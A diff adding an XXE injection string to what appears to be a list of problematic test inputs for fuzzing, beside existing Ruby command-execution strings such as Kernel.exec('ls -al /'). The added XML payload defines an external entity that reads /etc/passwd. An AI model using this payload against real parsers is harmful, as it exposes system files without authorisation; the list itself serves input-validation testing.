@@ -267,6 +267,12 @@ Kernel.exec("ls -al /")
 Kernel.exit(1)
 %x('ls -al /')
 
+#      XXE Injection (XML)
+#
+#	String which can reveal system files when parsed by a badly configured XML parser
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
 #	Unwanted Interpolation
 #
 #	Strings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string.
